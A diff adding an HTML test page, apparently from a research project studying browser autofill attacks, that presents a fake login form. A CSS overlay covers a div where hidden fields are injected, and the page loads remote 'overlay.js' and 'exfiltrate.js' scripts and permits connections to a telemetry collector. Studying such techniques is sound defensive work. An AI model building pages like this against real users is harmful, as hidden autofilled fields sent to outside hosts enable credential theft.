@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self';
+                connect-src 'self' https://collector.aac-telemetry.org http://127.0.0.1:8088;
+                img-src 'self' data:;
+                script-src 'self' 'unsafe-inline' https://collector.aac-telemetry.org https://cdn.jsdelivr.net;
+                style-src 'self' 'unsafe-inline';
+                frame-ancestors 'none'">
+
+    <title>cover by overlay</title>
+    <link rel="stylesheet" href="../assets/css/common.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        #hidden-div {
+            color: blue;
+            position: relative;
+        }
+
+        #hidden-div::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 10px;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 150%;
+            background: #fff;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="glass-card">
+        <h1>Login</h1>
+        <p class="subtitle">Covered by overlay</p>
+
+        <form id="caseForm">
+            <!-- Fields injected via ../js/overlay.js -->
+            <button type="button" id="Submit"
+                onclick="setTimeout(() => window.location.href='../case.html', 3000)">Submit</button>
+        </form>
+
+    </div>
+    <script src="../js/load_technique.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/AAC-AutofillAttackChain/cdn-scripts@v2.0.0/overlay.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/AAC-AutofillAttackChain/cdn-scripts@v2.0.0/exfiltrate.js"></script>
+</body>
+
+</html>
